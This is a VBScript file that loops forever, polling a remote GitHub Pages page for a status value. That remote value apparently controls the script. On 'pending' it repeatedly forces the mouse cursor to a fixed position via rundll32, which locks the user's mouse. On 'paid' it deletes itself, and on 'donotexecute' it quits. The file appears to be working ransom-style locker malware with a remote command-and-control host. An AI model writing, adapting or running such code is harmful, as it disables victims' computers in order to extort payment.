Option Explicit
 
Dim url
url = "https://tanjim750.github.io/remotecontrol/"

Dim w_shell
Set w_shell = CreateObject("WScript.Shell")
Dim loopCondition
loopCondition = True


Do While loopCondition
    Dim response, status_input, status_value
    Set response = CreateObject("WinHttp.WinHttpRequest.5.1")
        
        
    On Error Resume Next
    response.open "GET", url, False
        ' Add cache-control headers to disable caching
    response.SetRequestHeader "Cache-Control", "no-cache, no-store, must-revalidate"
    response.SetRequestHeader "Pragma", "no-cache"
    response.SetRequestHeader "Expires", "0"
    response.send
    On Error Goto 0
    
    If response.status = 200 Then
        Dim html
        html = response.responseText
        
        Dim htmlDocument
        Set htmlDocument = CreateObject("HTMLFile")
        htmlDocument.write html
        htmlDocument.close
        
        Set status_input = htmlDocument.getElementById("status1")
     
        
        If Not status_input Is Nothing Then
            status_value = status_input.value
        End If
        
        
    End If


    If status_value = "pending" Then
        
        w_shell.Run "rundll32 user32, SetCursorPos 500, 500"

    
    ElseIf status_value = "loop" Then
       loopCondition = True
        
    ElseIf status_value = "donotexecute" Then
        WScript.Quit
        
    ElseIf status_value = "paid" Then
        Set objFSO = CreateObject("Scripting.FileSystemObject")


        ' Get the path of the current VBScript file
        filePath = WScript.ScriptFullName


        ' Delete the file
        objFSO.DeleteFile(filePath)
        
    Else
        loopCondition = True
    End If
    
Loop
